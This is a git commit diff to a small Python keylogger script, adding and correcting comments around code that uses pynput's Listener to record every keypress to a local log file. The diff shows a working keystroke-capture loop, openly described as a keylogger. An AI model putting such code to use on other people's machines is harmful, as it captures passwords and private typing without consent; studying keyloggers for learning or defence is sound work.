36cdeb1e1e875d678c5af600276afa1c7f060bfe
Abhiram-rp <abhiramrp081@gmail.com>
2025-11-23 12:53:52 +0530

    Comments added

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 #Keylogger stores whatever was typed in a text file.
 
-# using the 'with' kwyword releases the memory automatically
+# using the 'with' keyword releases the memory automatically
 
 
 from pynput.keyboard import Listener
@@ -19,10 +19,11 @@ def write_To_File(key):
     if(letter == 'Key.enter'):
         letter = '\n'
 
+#We can handle other key codes as well as per requirement.
+
     with open("Keylogger/log.txt",'a') as f:
         f.write(letter)
 
 
-
-with Listener(on_press=write_To_File) as l:
-    l.join()
+with Listener(on_press=write_To_File) as l:   # creating an object of Listener
+    l.join()    # to join all the letters entered together
